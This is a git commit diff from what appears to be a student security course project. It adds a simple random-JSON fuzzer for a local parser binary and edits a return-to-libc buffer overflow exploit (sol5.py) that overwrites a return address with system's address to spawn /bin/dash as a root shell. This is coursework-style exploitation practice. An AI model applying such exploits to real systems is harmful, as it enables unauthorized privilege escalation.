8ddbeeee6c2d8f93baafa288cacb6127e225721d
Trever Cullen <trevercullen@gmail.com>
2017-03-27 22:17:41 -0400

    fizzer intro

--- project4/fuzzer.py
+++ project4/fuzzer.py
@@ -1,7 +1,72 @@
 #!/user/bin/bash/python
 
-def main():
+import subprocess
+import os
+import base64
+import sys
+import random
+import string
+
+def get_int():
+    return random.randint(0,50)
+def get_string():
+    temp = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(get_int()))
+    return '\"' + temp + '\"'
+
+
+# get a tuple of shit
+def get_tuple():
     
+    tp = get_string() + ':'
+
+    i = random.randint(1, 10)
+    x = random.randint(1, 10)
+
+    if x % i == 0: # integer
+        tp += str(get_int())
+
+    else: # string
+        tp += get_string()
+
+    return str(tp)
+
+
+
+# get json object
+def get_obj():
+    obj = '{'
+    for x in range(get_int()):
+        obj += get_tuple()
+        obj += ','
+    obj += '}'
+    return obj
+
+
+# return a list of tests
+def get_tests():
+    tests = []
+    for x in range(1, get_int()):
+        obj = get_obj()
+        tests.append(obj)
+    return tests
+
+
+def main():
+
+    print('fuck')
+
+    
+    while True:
+    # for testcase in tests:
+        broken = []
+        tests = get_tests()
+        for testcase in tests:
+            child = subprocess.Popen("./jsonParser", stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+            _, stdErrOut = child.communicate(input = testcase)
+            if child.returncode != 0:
+                broken.append(testcase)
+                sys.exit(0)
+
 
 
 if __name__ == '__main__':
--- project4/sol5.py
+++ project4/sol5.py
@@ -2,12 +2,6 @@
 
 from struct import pack
 
-##Proof of concept recalling greetings
-#filler = "D"*22
-#ret = pack("<I", 0x0804887c) #start of greetings
-#dummy_ret = "f"*4
-#print filler + ret + dummy_ret
-
 #Need to run /bin/sh and open a root shell
 filler = "D"*22
 ret = pack("<I", 0x0804ef50) #start of system
@@ -15,3 +9,4 @@ dummy_ret = "f"*4
 arg = pack("<I", 0xbffefaa8) #wherever shell code string is
 command = "/bin/dash"
 print filler + ret + dummy_ret + arg + command
+
